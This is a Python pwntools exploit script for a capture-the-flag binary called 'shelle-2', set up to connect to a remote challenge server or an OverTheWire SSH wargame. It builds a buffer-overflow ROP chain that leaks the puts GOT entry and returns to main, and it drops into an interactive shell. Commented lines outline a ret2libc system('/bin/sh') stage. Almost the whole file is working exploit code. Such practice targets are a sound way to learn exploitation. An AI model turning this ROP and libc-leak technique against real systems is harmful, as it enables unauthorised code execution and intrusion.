from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './shelle-2'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('challenge.ctf.games',30174) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, """b*0x0040146e
    b *0x00401509
    b*0x0040156b""")



##########################
##### OFFSET FINDER ######
##########################

OFFSET = b'\x5c'*(0x218-0x38+1)




#####################
#### Find Gadgets ###
#####################


#BINSH = next(LIBC.search(b'/bin/sh')) #Verify with find /bin/sh
#SYSTEM = LIBC.sym['system']
#EXIT = LIBC.sym['exit']


#log.info('bin/sh %s ' % hex(BINSH))
#log.info('system %s ' % hex(SYSTEM))
#log.info('exit %s ' % hex(EXIT))

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
RET = (ROP_LOADED.find_gadget(['ret']))[0]
FUNC_GOT = ELF_LOADED.got['puts']
PUTS_PLT = ELF_LOADED.plt['puts']

log.info('POP_RDI %s ' % hex(POP_RDI))
log.info('Main start: ' + hex(MAIN_PLT))
rop2 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) +p64(0xffffffffff600409)*4+ p64(PUTS_PLT) + p64(MAIN_PLT)

P.sendline(rop2)
P.interactive() #Interact with your shell :)




